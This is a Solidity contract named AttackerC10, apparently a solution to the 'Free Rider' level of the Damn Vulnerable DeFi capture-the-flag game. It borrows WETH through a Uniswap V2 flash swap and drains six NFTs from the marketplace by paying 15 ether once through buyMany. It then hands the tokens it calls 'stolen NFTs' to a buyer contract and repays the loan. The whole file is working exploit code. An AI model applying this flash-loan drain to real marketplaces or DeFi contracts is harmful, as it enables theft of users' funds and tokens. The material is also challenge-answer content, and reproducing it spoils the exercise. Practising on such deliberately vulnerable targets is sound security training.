// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../FreeRiderNFTMarketplace.sol";
import "../../DamnValuableNFT.sol";

error Unauthorized();
error PaymentNotReceived();

/**
 * @title AttackerC10
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC10 is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address immutable owner;

    FreeRiderNFTMarketplace immutable MARKETPLACE;
    IUniswapV2Factory immutable UNISWAP_FACTORY;

    address immutable WETH;
    address immutable BUYER;

    constructor(
        address payable _marketplace,
        address _uniswapFactory,
        address _weth,
        address _buyer
    ) {
        owner = msg.sender;
        MARKETPLACE = FreeRiderNFTMarketplace(_marketplace);
        UNISWAP_FACTORY = IUniswapV2Factory(_uniswapFactory);
        WETH = _weth;
        BUYER = _buyer;
    }

    function exploit(address otherToken, uint256 wethBorrowAmount) external {
        _flashSwapForWETH(otherToken, wethBorrowAmount);
    }

    function _flashSwapForWETH(address otherToken, uint256 wethBorrowAmount)
        internal
    {
        address pair = UNISWAP_FACTORY.getPair(WETH, otherToken);

        if (pair == address(0))
            revert("AttackerC10._flashSwapForWETH: WETH pair does not exist!");

        uint256 amount0Out;
        uint256 amount1Out;

        // Find WETH position
        IUniswapV2Pair(pair).token0() == WETH
            ? amount0Out = wethBorrowAmount
            : amount1Out = wethBorrowAmount;

        // Execute swap
        IUniswapV2Pair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(wethBorrowAmount)
        );
    }

    function uniswapV2Call(
        address sender,
        uint256,
        uint256,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = UNISWAP_FACTORY.getPair(token0, token1);

        // Verify sender
        if (msg.sender != pair) revert Unauthorized();
        if (sender != address(this)) revert Unauthorized();

        // Decode data from AttackerC10._flashSwapForWETH
        uint256 wethBorrowAmount = abi.decode(data, (uint256));

        // Calculate swap fee
        uint256 uniswapFee = ((wethBorrowAmount * 3) / 997) + 1;

        // Exchange WETH for ether
        uint256 wethBal = abi.decode(
            WETH.functionCall(
                abi.encodeWithSignature("balanceOf(address)", address(this))
            ),
            (uint256)
        );
        WETH.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", wethBal)
        );

        // Initialize a memory array of 6 token IDs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }

        // Execute attack
        MARKETPLACE.buyMany{value: 15 ether}(tokenIds);

        uint256 ethBal = owner.balance;
        uint256 gas = gasleft();

        // Transfer stolen NFTs to buyer
        DamnValuableNFT nft = MARKETPLACE.token();
        for (uint256 tokenId; tokenId < 6; ) {
            nft.safeTransferFrom(address(this), BUYER, tokenId);
            unchecked {
                ++tokenId;
            }
        }

        if (owner.balance < ethBal + 45 ether - (gas - gasleft()))
            revert PaymentNotReceived();

        // Pay back swap
        WETH.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            wethBorrowAmount + uniswapFee
        );
        WETH.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                pair,
                wethBorrowAmount + uniswapFee
            )
        );
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
